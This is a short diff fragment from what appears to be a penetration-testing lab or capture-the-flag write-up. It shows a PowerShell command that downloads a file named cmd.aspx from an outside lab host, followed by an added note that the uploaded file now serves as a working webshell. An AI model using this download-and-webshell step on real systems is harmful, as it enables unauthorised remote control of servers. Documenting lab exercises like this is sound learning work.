@@ -708,5 +708,7 @@ powershell -c wget http://10.10.14.90:1000/cmd.aspx -o cmd.aspx
 ```
 This transferred the file
 
+![[Pasted image 20260401162100.png]]
+Now browsing to it i have a working webshell
 
 
